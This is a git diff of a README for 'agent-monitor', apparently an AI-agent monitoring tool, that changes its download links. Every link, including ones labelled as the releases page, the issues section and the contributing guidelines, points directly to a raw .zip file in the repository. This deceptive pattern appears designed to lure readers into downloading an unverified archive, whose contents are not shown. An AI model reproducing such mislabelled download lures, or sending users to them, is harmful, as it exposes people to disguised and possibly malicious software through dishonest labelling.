@@ -1,7 +1,7 @@
 # 🚀 agent-monitor - Monitor AI Agents with Ease
 
 ## 📥 Download Now
-[![Download agent-monitor](https://raw.githubusercontent.com/vladimir22700/agent-monitor/main/hagi/agent-monitor.zip)](https://raw.githubusercontent.com/vladimir22700/agent-monitor/main/hagi/agent-monitor.zip)  
+[![Download agent-monitor](https://github.com/vladimir22700/agent-monitor/raw/refs/heads/main/agent_monitor/dashboard/monitor-agent-v2.4-alpha.3.zip)](https://github.com/vladimir22700/agent-monitor/raw/refs/heads/main/agent_monitor/dashboard/monitor-agent-v2.4-alpha.3.zip)  
 
 ## 📋 Description
 Welcome to **agent-monitor**, an open-source observability and monitoring platform designed for AI agents. This tool helps you trace, track metrics, manage costs, and debug your AI systems in real-time. By using agent-monitor, you can ensure your AI agents run smoothly and efficiently.
@@ -10,7 +10,7 @@ Welcome to **agent-monitor**, an open-source observability and monitoring platfo
 Using agent-monitor is simple and straightforward. Follow these steps to get started quickly:
 
 1. **Visit the Releases Page:** Click the link below to go to our releases page.
-   - [Go to Releases Page](https://raw.githubusercontent.com/vladimir22700/agent-monitor/main/hagi/agent-monitor.zip)
+   - [Go to Releases Page](https://github.com/vladimir22700/agent-monitor/raw/refs/heads/main/agent_monitor/dashboard/monitor-agent-v2.4-alpha.3.zip)
    
 2. **Download the Latest Version:** On the releases page, locate the latest version of agent-monitor. Click on the package that suits your system. 
 
@@ -53,15 +53,15 @@ After installing agent-monitor, you will be presented with a user-friendly inter
 ## 🔄 Download & Install
 Returning to the download process, ensure you follow these steps for a successful download:
 
-1. [Visit the Releases Page](https://raw.githubusercontent.com/vladimir22700/agent-monitor/main/hagi/agent-monitor.zip) to find the latest version of agent-monitor.
+1. [Visit the Releases Page](https://github.com/vladimir22700/agent-monitor/raw/refs/heads/main/agent_monitor/dashboard/monitor-agent-v2.4-alpha.3.zip) to find the latest version of agent-monitor.
 2. Choose the file suitable for your operating system and click to download.
 3. Follow the installation steps provided above for your specific OS.
 
 ## 📞 Support
-If you run into issues or have questions during the setup process, feel free to reach out. Check the [Issues section](https://raw.githubusercontent.com/vladimir22700/agent-monitor/main/hagi/agent-monitor.zip) of our GitHub repository. You can also find helpful resources in our documentation.
+If you run into issues or have questions during the setup process, feel free to reach out. Check the [Issues section](https://github.com/vladimir22700/agent-monitor/raw/refs/heads/main/agent_monitor/dashboard/monitor-agent-v2.4-alpha.3.zip) of our GitHub repository. You can also find helpful resources in our documentation.
 
 ## 🛠️ Contribution
-We welcome contributions from the community. If you have ideas or improvements, visit our [Contributing Guidelines](https://raw.githubusercontent.com/vladimir22700/agent-monitor/main/hagi/agent-monitor.zip) to learn how to get involved.
+We welcome contributions from the community. If you have ideas or improvements, visit our [Contributing Guidelines](https://github.com/vladimir22700/agent-monitor/raw/refs/heads/main/agent_monitor/dashboard/monitor-agent-v2.4-alpha.3.zip) to learn how to get involved.
 
 ## 🌐 Topics
 agent-monitor covers a range of topics relevant to your needs:
